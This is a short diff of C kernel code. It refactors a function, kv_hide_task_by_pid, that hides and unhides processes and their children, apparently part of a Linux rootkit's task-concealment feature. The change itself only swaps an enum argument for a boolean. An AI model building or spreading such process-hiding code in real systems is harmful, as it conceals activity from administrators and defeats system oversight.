@@ -255,11 +255,11 @@ static int _reload_hidden_task(void *t)
 		// this will unhide the task
 		// and make its children visible
 		kv_hide_task_by_pid(task->pid, status.saddr,
-				    NO_CHILDREN /** unhide only this task */);
+				    false /** unhide only this task */);
 
 		// Now hide the task, side effect is that
 		// children are re-evaluated */
-		kv_hide_task_by_pid(task->pid, status.saddr, NO_CHILDREN);
+		kv_hide_task_by_pid(task->pid, status.saddr, false);
 	}
 	goto out;
 error:
@@ -326,12 +326,12 @@ bool kv_find_hidden_task(struct task_struct *task)
 	return false;
 }
 
-int kv_hide_task_by_pid(pid_t pid, __be32 saddr, Operation op)
+int kv_hide_task_by_pid(pid_t pid, __be32 saddr, bool children)
 {
 	int rc = 0;
 	struct task_struct *task = _check_hide_by_pid(pid);
 	if (task) {
-		if (op == CHILDREN)
+		if (children)
 			_unhide_children(task);
 		else {
 			struct hidden_tasks ht = { .task = task,
